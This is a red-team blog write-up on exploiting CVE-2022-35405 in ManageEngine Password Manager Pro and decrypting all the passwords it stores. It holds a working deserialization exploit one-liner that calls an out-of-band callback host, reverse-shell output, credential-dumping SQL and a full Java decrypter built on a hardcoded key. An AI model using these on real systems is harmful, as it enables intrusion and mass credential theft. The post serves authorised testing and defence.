---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-09-05_how-to-decrypt-manage-engine-pmp-passwords-for-fun-and-domain-admin-a-red-teamin.md
original_filename: 2022-09-05_how-to-decrypt-manage-engine-pmp-passwords-for-fun-and-domain-admin-a-red-teamin.md
title: How to Decrypt Manage Engine PMP Passwords for Fun and Domain Admin - a Red
  Teaming Tale
category: documents
detected_topics:
- command-injection
- access-control
- rate-limit
- automation-abuse
- api-security
- cloud-security
tags:
- imported
- documents
- command-injection
- access-control
- rate-limit
- automation-abuse
- api-security
- cloud-security
language: en
raw_sha256: b1811a28e93245a992037ca5f64c1a1a60173b197190c057dcf97c25f4cf0245
text_sha256: 217c44ba4a80ceda0a86c9c7983229771c9936d1add268e67687d4c7129605c2
ingested_at: '2026-06-28T07:32:14Z'
sensitivity: unknown
redactions_applied: true
---

# How to Decrypt Manage Engine PMP Passwords for Fun and Domain Admin - a Red Teaming Tale

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-09-05_how-to-decrypt-manage-engine-pmp-passwords-for-fun-and-domain-admin-a-red-teamin.md
- Source Type: markdown
- Detected Topics: command-injection, access-control, rate-limit, automation-abuse, api-security, cloud-security
- Ingested At: 2026-06-28T07:32:14Z
- Redactions Applied: True
- Raw SHA256: `b1811a28e93245a992037ca5f64c1a1a60173b197190c057dcf97c25f4cf0245`
- Text SHA256: `217c44ba4a80ceda0a86c9c7983229771c9936d1add268e67687d4c7129605c2`


## Content

---
title: "How to Decrypt Manage Engine PMP Passwords for Fun and Domain Admin - a Red Teaming Tale"
page_title: "Shielder - How to Decrypt Manage Engine PMP Passwords for Fun and Domain Admin - a Red Teaming Tale"
url: "https://www.shielder.com/blog/2022/09/how-to-decrypt-manage-engine-pmp-passwords-for-fun-and-domain-admin-a-red-teaming-tale/"
final_url: "https://www.shielder.com/blog/2022/09/how-to-decrypt-manage-engine-pmp-passwords-for-fun-and-domain-admin-a-red-teaming-tale/"
authors: ["smaury (@smaury92)", "TheZero (@Th3Zer0)"]
programs: ["Zoho (ManageEngine)"]
bugs: ["Cryptographic issues"]
publication_date: "2022-09-05"
added_date: "2022-10-21"
source: "pentester.land/writeups.json"
original_index: 2214
---

[![shielder logo homepage](https://www.shielder.com/img/logoshielder.svg)](https://www.shielder.com/ "homepage") __

  * [Home](https://www.shielder.com/ "Home")
  * [Company](https://www.shielder.com/company "Company")
  * [Services](https://www.shielder.com/services "Services")
  * [Advisories](https://www.shielder.com/advisories "Advisories")
  * [Blog](https://www.shielder.com/blog "Blog")
  * [Careers](https://www.shielder.com/careers "Careers")
  * [Contacts](https://www.shielder.com/contacts "Contacts")
  * ENG

[ENG](https://www.shielder.com/blog/2022/09/how-to-decrypt-manage-engine-pmp-passwords-for-fun-and-domain-admin-a-red-teaming-tale/ "ENG") [ITA](https://www.shielder.com/it/blog/2022/09/how-to-decrypt-manage-engine-pmp-passwords-for-fun-and-domain-admin-a-red-teaming-tale/ "ITA")

# How to Decrypt Manage Engine PMP Passwords for Fun and Domain Admin - a Red Teaming Tale

## TL;DR

During a recent Red Teaming assessment we have found an internet-exposed instance of ManageEngine’s Password Manager Pro which was vulnerable to a pre-authentication Remote Code Execution ([CVE-2022-35405](https://www.manageengine.com/products/passwordmanagerpro/advisory/cve-2022-35405.html)). After gaining code execution we reverse engineered the password encryption/decryption routine to decrypt all the passwords and hack our way to become Domain Admin.

## What’s a Red Teaming?

Red Team(ing) is an abused word in the InfoSec world and it’s commonly used to define various things:

  * A team performing offensive security activities.
  * Any type of activity which involves some offensive security operations (i.e. a Network Penetration Test is sometimes defined a Red Teaming).
  * A specific type of security assessment which could involve the technological, human, and physical domains aimed to test the detection and response capabilities of a company.

When we - as in Shielder - say Red Team(ing) refer to the latest one: a real simulation of an attack, using the same techniques a real malicious party would use, to understand if the Security Operation Center (SOC) is able to detect and respond properly.

## Context!

Recently we were engaged for a Red Teaming Assessment and, while analyzing the external perimeter during the initial reconnaissance phase, we detected an instance of [ManageEngine Password Manager Pro](https://www.manageengine.com/products/passwordmanagerpro/), which, as suggested by its name, is a password manager. Finding a self-hosted password manager is _usually_ a clue that the company has a good security awareness and you could expect your beloved [Password Spraying](https://attack.mitre.org/techniques/T1110/003/) for initial access to fail.

## All That Glitters is Not Gold

Besides what stated above, an internet-exposed password manager is also a great target for initial access as being able to compromise it _might_ lead to full infrastructure takeover.

With this potential goal in mind, we checked the version of the ManageEngine Password Manager Pro instance and, based on that, we searched for known vulnerabilities.

Sometimes - as an attacker - you are just lucky and that was the case. The instace exposed by our customer was vulnerable to a fairly recent [Unauthenticated Remote Code Execution (CVE-2022-35405)](https://www.manageengine.com/products/passwordmanagerpro/advisory/cve-2022-35405.html). The vulnerability, which scored a CVSS of 9.8 ([CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H&version=3.1)) has been discovered by Vinicus and there is a [great write-up by Y4er](https://xz.aliyun.com/t/11578) (even though you might need some Google Translate-fu).

## Crafting the Exploit

The Y4er’s write-up is pretty detailed, therefore we won’t dive deep into it but we will just show how to quickly craft a working exploit.

Based on the patch diff we know that the vulnerability is in the XML-RCP handler, where an attacker could add a Java serialized object, which will be unserialized by the server once received.

Java [insecure deserialization](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html) is very dangerous. If you manage to force a Java application into deserializing an arbitrary object, then you could instanciate arbitrary classes among the available ones and eventually obtain arbitrary code execution. To do so, you must find a gadget chain, which process might be tedious and usually requires you to have the sourcecode or at least the bytecode of the application (if you are interested in how to find your own gadgets you should checkout [[1]](https://www.synacktiv.com/en/publications/finding-gadgets-like-its-2015-part-1.html), [[2]](https://www.synacktiv.com/en/publications/finding-gadgets-like-its-2015-part-2.html), and [[3]](https://www.synacktiv.com/en/publications/finding-gadgets-like-its-2022.html)).

Hopefully, tools come in handy for this task. [@frohoff](https://twitter.com/frohoff) built a tool called [ysoserial](https://github.com/frohoff/ysoserial) which contains a list of known gadgets and simplifies the creation of serialized objects. The power of ysoserial is that you could blindly create serialiazed objects for all the known gadgets and just try them to understand which one is working. Once done you could move on with the proper exploitation.

To do that we usually use some glue bash scripting, even though there is also a [Burp Suite](https://portswigger.net/burp) extension called [Java Deserialization Scanner](https://portswigger.net/bappstore/228336544ebe4e68824b5146dbbd93ae) by our friend [Federico Dotta](https://twitter.com/apps3c) which could be used to automate the detection and even the exploitation of insecure deserializations in Java web applications.
  
  
  1
  

| 
  
  
  java -jar ysoserial.jar  2>&1 | awk '{print $1}' | head -n 41 | tail -n +10 | while read line; do echo $line; done | while read line; do java -jar ysoserial.jar $line "cmd.exe /c nslookup $line.3mql62c7omj4kywt9lmurf4j1a70vp.oastify.com" | base64 -w 0 2>/dev/null; echo; done | sort -u | while read line; do curl https://$target/xmlrpc -H "Content-Type: text/xml" --data-binary "<?xml version=\"1.0\"?><methodCall><methodName>acidburn</methodName><params><param><value><struct><member><name>acidburn</name><value><serializable xmlns=\"http://ws.apache.org/xmlrpc/namespaces/extensions\">$line</serializable></value></member></struct></value></param></params></methodCall>"; done
  
  
---|---  
  
We hope one-liners estimators will love it, for the others - yes we know it could look better but that’s how lazy hackers would do it 😜 The idea behind this brute-force approach is that, if a given gadget works, then the server tries to resolve `$gadgetName.$ourBurpCollaboratorDomain` and we would get an entry in our [Burp Suite Collaborator](https://portswigger.net/burp/documentation/collaborator) client showing that the attack worked and which gadget(s) did the job.

In our case, the winner was …🥁🥁🥁… [CommonsCollections5](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections5.java)!

From that point on it’s just a matter of Powershell-fu, obfuscation, and AV/EDR evasion to get your reverse shell.
  
  
  $ nc -lvnp 80
  Listening on 0.0.0.0 80
  Connection received on 1.3.3.7 56073
  Microsoft Windows [Version 10.0.14393]
  (c) 2016 Microsoft Corporation. All rights reserved.
  
  C:\ManageEngine\PMP\bin>
  

## There Are Password Managers and Password Managers

There are various types of password managers around, starting from a post-it on the monitor, going through a txt file on the desktop, evolving in cloud-based SaaS products, till devices with hardware-based encryption.

What we are analyzing is an enterprise-grade self-hosted password manager. These kind of products, besides the usual password manager features (i.e. storing password in an encrypted way and allowing the entries owner to read them), also allow password sharing between different users by setting up groups/collections. In a company environment this is a key feature as you want/need multiple people to collaborate on the same project(s) and let them using/editing the required credentials.

As passwords should be accessed but at the same time protected, password managers encrypt them.

In a single-user scenario a strong and secure password manager would:

  * Ask the user to create a strong passphrase.
  * Encrypt all the entries of the password manager using such passphrase.
  * Require the user to unlock the database with their passphrase to access the passwords.

This implementation is as secure as the encryption algorithm in use and the passphrase roboustness.

When it comes to multiple-user scenarios the encryption approach is not obvious anymore. Let’s take as example how [Bitwarden](https://bitwarden.com/blog/password-sharing-with-organizations/) securerly implements this feature:

  * Each user has a keypair (a public key and a private one, which is encrypted with the user passphrase).
  * When Alice adds a shared password, she encrypts it with a symmetric key, then encrypts the symmetric key with her public key and Bob’s public key and finally stores the encrypted password and the encrypted symmetric key in the database.
  * When Bob wants to access the shared password, he needs to decrypt his asymmetric private key with his passphrase, download the encrypted password and the encrypted symmetric key, decrypt the symmetric key with his asymmetric private key, and finally use the obtained symmetric key to decrypt the password.

Again, this implementation is as secure as the encryption algorithm in use and the passphrase roboustness.

In both the cases the password manager is agnostic and used as an encrypted objects storage only. This means that, even though a user compromises the password manager confidentiality, they could not read the plaintext passwords (unless a weak encryption algorithm or a weak passphrase have been used).

Unfortunately, not all the password managers are the same.

Due to its type of audience an enterprise-grade software usually needs(?) to prioritize business continuity, therefore security might be traded for that. What does it mean? It means that in the aforementioned examples, if a user forgets their own passphrase, then the passwords are lost forever. Obviously, if multiple users could access the same shared passwords, then all of them should forget their passphrase at the same time but that’s still a risk. That’s why some password managers, including ManageEngine Password Manager Pro, use a different approach:

  * Each user has a username and password combination.
  * When Alice wants to access a password, she logs into the password manager.
  * The password manager checks which are Alice’s privileges and if the password she requested could be accessed by her.
  * If the check is successful:
  * The password manager uses its own passphrase(s) to decrypt the password and returns it to Alice.
  * If the check fails:
  * The password is not decrypted or returned.

While at a first glance this approach could look secure, it exposes the passwords to various threats:

  * Any system administrator (including potential outsourcers) could log into the password manager server and decrypt all the passwords.
  * Any attacker able to obtain code execution and/or arbitrary file read on the password manager server could decrypt all the passwords.

If these threats look too potential to you - keep reading and learn how we reverse engineered ManageEngine Password Manager Pro to obtain all the plaintext passwords and 🧗 to Domain Admin.

## Understanding the Crypto Magic

Let’s wrap-up what we have, in case we lost someone in the password managers digression:

  * We could execute arbitrary code/commands on the ManageEngine Password Manager Pro (PMP) server.
  * We spoilered that PMP uses a weak encryption approach and an attacker with access to the server could decrypt all the password - let’s learn how!

Through our reverse shell we collected some information:

  * PMP is a Java web application and it comes as a collection of JAR files containing the Java bytecode - which could be easily decompiled.
  * While PMP supports various DBMS, our instance was using PostgreSQL, which is the default one.

By reading the documentation we understood that passwords are stored in the database and that the DB password is stored inside the `database_params.conf` file. Unfortunately, the DB password is encrypted itself, therefore we need to understand how to decrypt it.

> NOTE: While approaching these kind of tasks it’s important to keep in mind we could assume that all the information needed to encrypt/decrypt are on the server itself, otherwise service restarts would need a manual intervention and such procedure is not mentioned anywhere in the documentation.

The method that takes care of decrypting the DB password is `getDecryptedPassword` of the `com.adventnet.passtrix.db.DecryptDBPassword` class which is just a proxy for the `decryptPassword` method of the `com.adventnet.passtrix.ed.PMPEncryptDecryptImpl` class, which accepts two arguments:

  * The ciphertext.
  * The decryption key.

> NOTE: Keep the `decryptPassword` method in mind since it is used to decrypt a lot of passwords with different decryption keys based on the context.

When decrypting a password through `decryptPassword`, PMP always performs the following steps:

  1. Base64-decodes the ciphertext.
  2. Splits the ciphertext:
  * The first 16 bytes are used as IV.
  * The other bytes are used as the actual ciphertext.
  3. If the decryption key:
  * is shorter than 32 bytes it is padded with spaces till 32 characters.
  * is longer than 32 bytes it is base64-decoded.
  4. Derivates the actual decryption key by using the `PBKDF2` algorithm using:
  * The padded/base64-decoded decryption key as input.
  * The `SHA1 HMAC` as hashing algorithm.
  * `\x01\x02\x03\x04\x05\x06\x07\x08` as salt.
  * `1024` iterations.
  * `256 bit` of output keylength.
  5. Decrypts the ciphertext with `AES` in `CTR` mode and `no padding` using the IV and the derived key.

The decryption routine is nice and all but what’s the password? By analyzing the code it is possible to discover that the password is hardcoded and it is: `md5(substring("@dv3n7n3tP@55Tri*", 5, 10))`.

Once we had access to the database we tried to dump all its content but we noticed that the values stored inside the `PASSWORD` column of the `Ptrx_PassBasedAuthen` table were in the following format `\x<hexstring>`. As mentioned before, all the passwords are decrypted using the `decryptPassword` method, which accepts the ciphertext base64-encoded, while in the database we had some hex values.

Let’s go ⏪⏪ to the source code.

PMP defines a set of “encrypted columns” which have an extra layer of encryption. In fact the data stored in such colums are encrypted at the database level with the `master key` and then again at application level by using the `PMP key`.

The `PMP key` is stored in a `pmp_key.key` file on the server filesystem and its location is defined in the `manage_key.conf` configuration file. Such key is installation-specific and it is automatically generated by PMP during the first startup.

The `master key`, on the other hand, is encrypted with the `PMP Key`and stored inside the database in the `notesdescription` column of the first row of the `Ptrx_NotesInfo` table. This latter key is used as the decryption secret in the `decryptschar` and `decryptsblob` database functions.

To wrap-up, in order to decrypt a password or any double-encrypted value we need to:

  1. Decrypt the `master key` with the `PMP key` using the `decryptPassword` method.
  2. Use the `master key` in the database query to extract the decrypted content (e.g. `SELECT decryptschar(PASSWORD, "master_key") FROM Ptrx_PassBasedAuthen`).
  3. Decrypt the retrieved data using the `decryptPassword` method with the `PMP key`.
  4. :tada:

## Crafting a Password Decrypter

Using what we have learned, we created the following Java program which can:

  * Decrypt the DB password.
  * Decrypt the `master key`.
  * Decrypt the passwords which are stored in the database.

The program is just a quick’n’dirty proof of concept, therefore is not meant to automate the full process:

  1. You need to obtain the encrypted DB password and the `PMP key` from the ManageEngine PMP server and run the program to decrypt the DB password.
  2. You need to connect to the database using the decrypted DB password and obtain the `master key`: `select notesdescription from Ptrx_NotesInfo`
  3. You need to dump the passwords from the database using the following query and replacing the `master key` obtained at step 2: `select ptrx_account.RESOURCEID, ptrx_resource.RESOURCENAME, ptrx_resource.DOMAINNAME, ptrx_resource.IPADDRESS, ptrx_resource.RESOURCEURL, ptrx_password.DESCRIPTION, ptrx_account.LOGINNAME, decryptschar(ptrx_passbasedauthen.PASSWORD,'master_key') from ptrx_passbasedauthen LEFT JOIN ptrx_password ON ptrx_passbasedauthen.PASSWDID = ptrx_password.PASSWDID LEFT JOIN ptrx_account ON ptrx_passbasedauthen.PASSWDID = ptrx_account.PASSWDID LEFT JOIN ptrx_resource ON ptrx_account.RESOURCEID = ptrx_resource.RESOURCEID`
  4. You can finally put the password(s) you want to decrypt in the program and get their plaintext counterparts.

  
  
  1
  2
  3
  4
  5
  6
  7
  8
  9
  10
  11
  12
  13
  14
  15
  16
  17
  18
  19
  20
  21
  22
  23
  24
  25
  26
  27
  28
  29
  30
  31
  32
  33
  34
  35
  36
  37
  38
  39
  40
  41
  42
  43
  44
  45
  46
  47
  48
  49
  50
  51
  52
  53
  54
  55
  56
  57
  58
  59
  60
  61
  62
  63
  64
  65
  66
  67
  68
  69
  70
  71
  72
  73
  74
  75
  76
  77
  78
  79
  80
  81
  82
  83
  84
  85
  86
  87
  88
  89
  90
  91
  92
  93
  94
  95
  96
  97
  98
  99
  100
  101
  102
  103
  104
  105
  106
  107
  108
  109
  110
  111
  112
  113
  114
  115
  116
  117
  118
  119
  120
  121
  122
  123
  124
  125
  126
  127
  128
  129
  130
  131
  

| 
  
  
  import java.security.InvalidAlgorithmParameterException;
  import java.security.InvalidKeyException;
  import java.security.Key;
  import java.security.MessageDigest;
  import java.security.NoSuchAlgorithmException;
  import java.security.spec.InvalidKeySpecException;
  import java.util.Base64;
  import java.lang.StringBuilder;
  
  import javax.crypto.BadPaddingException;
  import javax.crypto.Cipher;
  import javax.crypto.IllegalBlockSizeException;
  import javax.crypto.NoSuchPaddingException;
  import javax.crypto.SecretKey;
  import javax.crypto.SecretKeyFactory;
  import javax.crypto.spec.IvParameterSpec;
  import javax.crypto.spec.PBEKeySpec;
  import javax.crypto.spec.SecretKeySpec;
  
  class PimpMyPMP  {
  public synchronized String decrypt(byte[] cipherText, String password) throws Exception {
  Cipher cipher;
  byte[] aeskey;
  
  for (int i = password.length(); i < 32; ++i) {
  password=***REDACTED*** + " ";
  }
  if (password.length() > 32) {
  try {
  aeskey = Base64.getDecoder().decode(password);
  }
  catch (IllegalArgumentException e) {
  aeskey = password.getBytes();
  }
  }
  aeskey = password.getBytes();
  
  try {
  byte[] ivArr = new byte[16];
  for (int i = 0; i < 16; ++i) {
  ivArr[i] = cipherText[i];
  }
  cipher = Cipher.getInstance("AES/CTR/NoPadding");
  SecretKeyFactory factory = SecretKeyFactory.getInstance("PBKDF2WithHmacSHA1");
  PBEKeySpec spec = new PBEKeySpec(new String(aeskey, "UTF-8").toCharArray(), new byte[]{1, 2, 3, 4, 5, 6, 7, 8}, 1024, 256);
  SecretKey temp = factory.generateSecret(spec);
  SecretKeySpec secret = new SecretKeySpec(temp.getEncoded(), "AES");
  cipher.init(2, (Key)secret, new IvParameterSpec(ivArr));
  
  byte[] cipherTextFinal = new byte[cipherText.length - 16];
  int j = 0;
  for (int i = 16; i < cipherText.length; ++i) {
  cipherTextFinal[j] = cipherText[i];
  ++j;
  }
  
  return new String(cipher.doFinal(cipherTextFinal), "UTF-8");
  }
  catch (IllegalBlockSizeException | BadPaddingException | NoSuchAlgorithmException | NoSuchPaddingException | InvalidKeyException | InvalidAlgorithmParameterException | InvalidKeySpecException ex) {
  ex.printStackTrace();
  throw new Exception("Exception occurred while encrypting", ex);
  }
  }
  
  private static String hardcodedDBKey() throws NoSuchAlgorithmException {
  String key = "@dv3n7n3tP@55Tri*".substring(5, 10);
  MessageDigest md = MessageDigest.getInstance("MD5");
  md.update(key.getBytes());
  byte[] bkey = md.digest();
  StringBuilder sb = new StringBuilder(bkey.length * 2);
  for(byte b: bkey) {
  sb.append(String.format("%02x", b));
  }
  return sb.toString();
  }
  
  public String decryptDBPassword(String encPassword) throws Exception {
  String decryptedPassword=***REDACTED***
  if (encPassword != null) {
  try {
  decryptedPassword=***REDACTED*** PimpMyPMP.hardcodedDBKey());
  }
  catch (Exception e) {
  throw new Exception("Exception ocuured while decrypt the password");
  }
  return decryptedPassword;
  }
  throw new Exception("Password should not be Null");
  }
  
  public String decryptPassword(String encryptedPassword, String key) throws Exception {
  String decryptedPassword=***REDACTED***
  if (encryptedPassword=***REDACTED*** null || "".equals(encryptedPassword)) {
  return encryptedPassword;
  }
  try {
  byte[] encPwdArr = Base64.getDecoder().decode(encryptedPassword);
  decryptedPassword=***REDACTED*** key);
  }
  catch (Exception ex) {
  ex.printStackTrace();
  }
  return decryptedPassword;
  }
  
  public static void main(String[] args) {
  PimpMyPMP klass = new PimpMyPMP();
  try {
  // database_params.conf
  String database_password = "";
  System.out.print("Database Key: ");
  System.out.println(klass.decryptDBPassword(database_password));
  
  // pmp_key.key
  String pmp_password = "";
  
  // select notesdescription from Ptrx_NotesInfo
  String notesdescription = "";
  System.out.print("MASTER Key: ");
  System.out.println(klass.decryptPassword(notesdescription,pmp_password));
  
  // decryptschar(column, master_key)
  String passwd = "";
  System.out.print("Passwd=***REDACTED***
  System.out.println(klass.decryptPassword(passwd,pmp_password));
  
  } catch (Exception e){
  System.out.println("Fail!");
  }
  }
  }
  
  
---|---  
  
## 🤔🤨🧐

**Why didn’t you create a new user and logged in the PMP web panel?** Creating a user by interacting directly with the database is a hard process as each user has his own keystore with various information inside. To encrypt/decrypt the keystore the whole encryption/decryption flow should be understood and re-implemented, therefore it’s just easier to go straight with the DB decryption instead of creating a new user.

**Will this work also if other Database Management Systems are in use?** Yes and no, the general approach is the same, but the database-level encryption is different for each DBMS (e.g. MySQL uses the `AES_DECRYPT` function, MSSQL uses the `decryptbykeyautocert` function, some old PostgreSQL versions use the `pgp_sym_decrypt` function, etc.).

**On which version did you performe your analysis?** Password Manager Pro 12.1 in its default configuration (aka PostgreSQL as DBMS).

## Take Aways 🥡

Sometimes - not even that occasionally - security products might become a single point of failure for your business. Make sure to pick the right ones during you software selection process and to protect them as much as possible.

Along with that, performing Red Teaming Assessments would help you figuring out how your detection and response capabilities are mature against a motivated attacker:

  * Would your Blue Team detect a similar attack? At which stage before the attacker compromises the Crown Jewels?
  * Would your IT administrators be able to respond to a similar attack after it has been detected by the SOC?

## Pitch 🗣

Do you want to learn how resilient is your company against a real-world attack? [Get in touch](https://www.shielder.com/contacts/) with us to setup a [Red Teaming Assessment](https://www.shielder.com/services/network-security/).

__ 14 min

Date

5 September 2022

 __[reversing](/tags/reversing "reversing") [rce](/tags/rce "rce") [cryptography](/tags/cryptography "cryptography") [red teaming](/tags/red-teaming "red teaming")

Author

[smaury](/authors/smaury "smaury")

[ __](https://twitter.com/smaury92 "smaury Twitter profile")[__](https://github.com/smaury "smaury GitHub profile")[__](https://linkedin.com/in/smaury "smaury LinkedIn profile")

I’m Abdel Adim Oisfi aka smaury.  
Job: CEO, Security Researcher, Penetration Tester at Shielder.  
Passions: Hacking, hitchhiking, cliff jumping and skinned knees.

Author

[thezero](/authors/thezero "thezero")

[ __](https://github.com/TheZ3ro "thezero GitHub profile")

Security Researcher and Senior Penetration Tester at Shielder.  
In the office I’m the one with the soldering iron.

Previous post

[Printing Fake Fiscal Receipts - An Italian Job p.2](https://www.shielder.com/blog/2022/05/printing-fake-fiscal-receipts-an-italian-job-p.2/ "Printing Fake Fiscal Receipts - An Italian Job p.2")

Next post

[AWS CodeBuild + S3 == Privilege Escalation](https://www.shielder.com/blog/2023/07/aws-codebuild--s3-privilege-escalation/ "AWS CodeBuild + S3 == Privilege Escalation")

Info

Shielder S.p.A.

P.I. 11435310013

REA TO - 1213132

Registered Capital: 81.000,00 €

[Via Palestro, 1/C  
10064 Pinerolo (TO) Italy](https://www.google.it/maps/place/Shielder/@44.8833849,7.3303863,17z/data=!3m1!4b1!4m5!3m4!1s0x4788250440849fa5:0x74cf10f2092abc85!8m2!3d44.8833849!4d7.332575 "corporate headquarters")

![ISO27001](/img/iso27001.png)

![ISO9001](/img/iso9001.png)

Contacts

[info@shielder.com](mailto:info@shielder.com "email Shielder")

Landline: [(+39) 0121 - 39 36 42](tel:+390121393642 "Landline")

Commercial: [(+39) 345 - 57 18 634](tel:+393455718634 "Commercial")

Technical: [(+39) 393 - 16 66 814](tel:+393931666814 "Technical")

[ __](https://twitter.com/ShielderSec "Shielder Twitter profile")[__](https://bsky.app/profile/shielder.com "Shielder Bluesky profile")[__](https://infosec.exchange/@Shielder "Shielder Mastodon profile")[__](https://www.linkedin.com/company/shielder "Shielder LinkedIn profile")[__](https://github.com/shieldersec "Shielder Github profile")

Sitemap

[Home](https://www.shielder.com/ "Home")

[Company](https://www.shielder.com/company "Company")

[Services](https://www.shielder.com/services "Services")

[Advisories](https://www.shielder.com/advisories "Advisories")

[Blog](https://www.shielder.com/blog "Blog")

[Careers](https://www.shielder.com/careers "Careers")

[Contacts](https://www.shielder.com/contacts "Contacts")

Copyright © Shielder 2014 - 2026 [Disclosure policy](/disclosure-policy "Disclosure Policy") [Privacy policy](/privacy-policy "Privacy Policy")
